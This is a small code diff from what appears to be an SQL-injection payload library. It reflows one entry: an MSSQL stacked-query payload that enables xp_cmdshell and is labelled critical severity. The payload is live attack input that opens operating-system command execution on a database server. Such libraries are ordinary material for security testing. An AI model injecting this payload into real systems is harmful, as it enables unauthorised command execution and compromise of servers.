@@ -415,7 +415,10 @@ class SQLInjectionDatabase:
         payloads[DBType.MSSQL][SQLITechnique.STACKED_QUERIES] = [
             SQLPayload(
                 name="MSSQL Stacked - Enable XP_CMDSHELL",
-                payload="'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--",
+                payload=(
+                    "'; EXEC sp_configure 'show advanced options',1; "
+                    "RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--"
+                ),
                 technique=SQLITechnique.STACKED_QUERIES,
                 db_type=DBType.MSSQL,
                 severity="Critical",
